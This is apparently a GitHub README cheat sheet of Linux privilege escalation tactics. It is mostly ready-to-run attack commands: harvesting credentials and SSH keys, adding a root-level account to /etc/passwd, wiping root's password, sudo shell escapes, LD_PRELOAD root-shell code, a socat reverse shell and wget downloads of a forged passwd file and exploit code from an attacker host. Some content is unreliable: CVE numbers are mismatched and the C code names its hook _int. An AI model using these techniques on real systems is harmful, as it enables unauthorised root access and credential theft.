# Linux-Privilege-Escalation-Basics
Simple and accurate guide for linux privilege escalation tactics 

# Privilege Escalation Methods

- Basic System Enumeration
- Bash History
- OpenVPN Credentials
- Writable Password Files - /etc/passwd | /etc/shadow | /etc/sudoers
- SSH Private Keys 
- Kernel Expliots
- Sudo -l 
- Sudo CVE - CVE-2019-16634 | CVE-2019-16634
- Sudo LD_PRELOAD
- SUID / GUID Binaries
- Capabilities
- Cron Jobs
- NFS Root Squashing


# Basic System Enumeration
Structure : Linux Command // <Comment / Tip>
```
uname -a // What OS kernel are we using?
hostname // What is my hostname?
lscpu // What is our CPU architecture?
ls /home // Any Users? Can we access their home directories?
ls /var/www/html // Any web config files? Do they contain DB or user credentials?
ps aux | grep root // What services are running as root? Any cron jobs running specific files as root? Can we write to those files? 
netstat -tulpn // What is running? Are they bound to local host but not from the public? Possible port forwarding
ps -aux | grep root | grep mysql // Is MySQL running as root?
ifconfig // What is our IP? Are we dual-homed?
find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \; // Any files that contains clear-text credentials?
locate pass | more // Any files with the name pass?

```
# Bash History
Structure : Linux Command // <Comment / Tip>
```
history // Any clear-text credentials? Any command for logging into services with the credentials?
cat /home/<user>/.bash_history // Can we see CLI history of other users?

```

# OpenVPN Credentials
Structure : Linux Command // <Comment / Tip>
```
locate *.ovpn // Any OpenVPN files with clear-text credentials?

```

# Writable Password Files
Structure : Linux Command // <Comment / Tip>
```
ls -la /etc/passwd // Do we have write access to passwd?
If write access is enabled on /etc/passwd # Add new user with UID & GID of 0 (Root) OR Remove the root password

   echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
   su - hacker
   id && whoami
   
OR
   
  vi /etc/passwd
  Remote X (Password Holder) for root
  wg!
  su root
  id && whoami
  
OR

  echo root::0:0:root:/root:/bin/bash > /etc/passwd // Remove Root's Password
  
ls -la /etc/shadow // Do we have write access to shadow?
If write access is enabled on /etc/shadow // Generate new password hash and replace root's password

   Run python -c "import crypt; print crypt.crypt('NewRootPassword')"
   Copy the output
   vi /etc/shadow
   Replace root's hash with the output that you generated
   wq!
   su root // Provide the new root password you generated (Example: NewRootPassword)
   id && whoami
  
ls -la /etc/sudoers // Do we have write access to /etc/sudoers?
If write access is enabled on /etc/sudoers | Add new sudo entry

   echo "<username> ALL=(ALL:ALL) ALL" >> /etc/sudoers // Replace "Username" with your current user (Example: www-data)
   sudo su
   id && whoami

   ```
# SSH Private Keys 

Structure : Linux Command / <Comment / Tip>
```
find / -name id_rsa 2> /dev/null // Any SSH private keys? 

   Copy id_rsa contents of keys found with the above command
   Create a local file on your box and paste the content in
   chmod 600 <local_file>
   ssh -i <local_file> user@IP
   
   // Is the key password protected?

   ssh2john <local_file> > hash
   john hash --wordlist=/usr/share/wordlists/rockyou.txt
   
```

# Kernel Expliots

Structure : Linux Command // <Comment / Tip>
```
uname -a // What OS kernel are we using?

// Google Search (Example): 4.4.0-116-generic #140-Ubuntu Expliots OR 4.4.0-116-generic #140-Ubuntu PoC github
// Read the expliots and follow the instructions
// Popular Linux Kernel Exploits

Dirty COW (CVE-2016-5195)
URL: https://dirtycow.ninja/

Other Kernel Expliots
URL: https://github.com/SecWiki/linux-kernel-exploits

```

# Sudo -l

Structure : Linux Command / <Comment / Tip>
```
sudo -l / What binaries can we execute with sudo?

// Example Output

User www-data may run the following commands on <hostname>

(root) NOPASSWD: /usr/bin/find

Absuing sudo binaries to gain root
----------------------------------------------------
find
sudo find / etc/passwd -exec /bin/bash \;

Nmap
echo "os.execute('/bin/bash/')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse

Env
sudo env /bin/bash

Vim
sudo vim -c ':!/bin/bash'

Awk
sudo awk 'BEGIN {system("/bin/bash")}'

Perl
sudo perl -e 'exec "/bin/bash";'

Python
sudo python -c 'import pty;pty.spawn("/bin/bash")'

Less
sudo less /etc/hosts - !bash

Man
sudo man man - !bash

ftp
sudo ftp - ! /bin/bash

socat
Attacker = Attacker= socat file:`tty`,raw,echo=0 tcp-listen:1234
Victim = sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234 // Replace IP With your IP

Zip
echo test > notes.txt
sudo zip test.zip notes.txt -T --unzip-command="sh -c /bin/bash"

gcc
sudo gcc -wrapper /bin/bash,-s .

Docker
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh

MySQL
sudo mysql -e '\! /bin/sh'

SSH
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x

Tmux
Sudo tmux

pkexec
sudo pkexec /bin/bash

rlwrap
sudo rlwrap /bin/bash

xargs
sudo xargs -a /dev/null sh

anansi_util
sudo /home/anansi/bin/anansi_util manual /bin/bash // Change Path - Depending on sudo -l output 

Wget
Victim

cp /etc/passwd /tmp/passwd
cat /etc/passwd

Attacker

Copy /etc/passwd content and put in a local file called passwd
Run python -c "import crypt; print crypt.crypt('NewRootPassword')"
Copy output of the above command 
edit passwd
Replace x in root's line with the copied output
Save the file
python -m SimpleHTTPServer 9000 // You can use any port

Victim
sudo wget http://<attacker_ip>:9000/passwd -O /etc/passwd
su root // Enter the new root password you generated (Example: NewRootPassword)
id && whoami

```
# Sudo CVE

Structure : Linux Command // <Comment / Tip>
CVE-2019-14287

```
sudo -l

   Vulnerable output 
   Output = (ALL,!root) NOPASSWD: /bin/bash 

    Priv Escalation Command
    sudo -u#-1 /bin/bash
    id && whoami

```
Structure : Linux Command // <Comment / Tip>
CVE-2019-16634

```
sudo su root // If you type root's password , can you see the *****? That means pw_feedback is enabled
Expliot PoC: https://github.com/saleemrashid/sudo-cve-2019-18634
Download expliot.c
Upload to Victim 

Attacker
python -m SimpleHTTPServer 9000 // You can use any port

Victim
wget http://<attacker_ip>:9000/expliot.c
Compile expliot.c: gcc expliot.c -o expliot
./expliot
id && whoami 

```

# Sudo LD_PRELOAD

Structure : Linux Command // <Comment / Tip>
```
sudo -l 

Example Output: env_reset, env_keep+=LD_PRELOAD // Do you have the same output with sudo binary rights?

cd /tmp
vi priv.c
   
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _int() {

 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 system("/bin/bash");

}

Compile priv.c: gcc -fPIC -shared -o priv.so priv.c -nostartfiles
Command: sudo LD_PRELOAD=/tmp/priv.so awk // awk can be replaced with any sudo binary

```

# SUID / GUID Binaries
Structure : Linux Command // <Comment / Tip>

```
Basic Enumeration

----------------------------------------------------------------------

find / -perm -u=s -type f 2>/dev/null // Any Intresting binaries with SUID permissions?
find / -perm -g=s -type f 2>/dev/null // Any Intresting binaries with GUID permissions?
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; // Any Intresting binaries for SUID permissions?
find / -uid 0 -perm -4000 -type f 2>/dev/null // Any Intresting binaries for SUID permissions?

// Look for any binaries that seem odd. Any binaries running from a users home directory?
// Check the version of any odd binaries and see if there are any public expliots that can be used to gain root

Create a Simple Basic SUID binary

---------------------------------------------------------------------


```
